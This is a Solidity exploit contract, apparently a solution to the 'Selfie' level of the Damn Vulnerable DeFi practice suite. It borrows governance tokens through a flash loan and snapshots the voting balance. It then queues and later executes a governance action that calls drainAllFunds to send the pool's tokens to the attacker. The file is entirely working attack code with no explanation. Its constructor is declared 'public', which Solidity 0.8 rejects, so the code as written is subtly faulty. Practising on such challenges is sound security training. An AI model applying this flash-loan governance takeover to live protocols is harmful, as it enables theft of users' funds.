// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./../DamnValuableToken.sol";
import "./SimpleGovernance.sol";

contract Attack {
    SelfiePool public pool;
    DamnValuableToken public token;
    SimpleGovernance public governance;
    uint256 actionId;

    constructor(address _pool, address _token, address _governance) public {
        pool = SelfiePool(_pool);
        token = DamnValuableToken(_token);
        governance = SimpleGovernance(_governance);
    }

    fallback() external payable {
        token.snapshot();
        token.transfer(address(pool), token.balanceOf(address(this)));
    }

    function attack() external {
        pool.flashloan(token.balanceOf(address(this)));

        actionId = governance.queueAction(
            address(pool), abi.encodeWithSignature("drainAllFunds(address)", address(msg.sender)), 0
        );
    }

    ///@notice call this function after 2 days of calling attack() i.e., after 2 days of action being queued
    function finalAttack() external {
        governance.executeAction(actionId);
    }
}
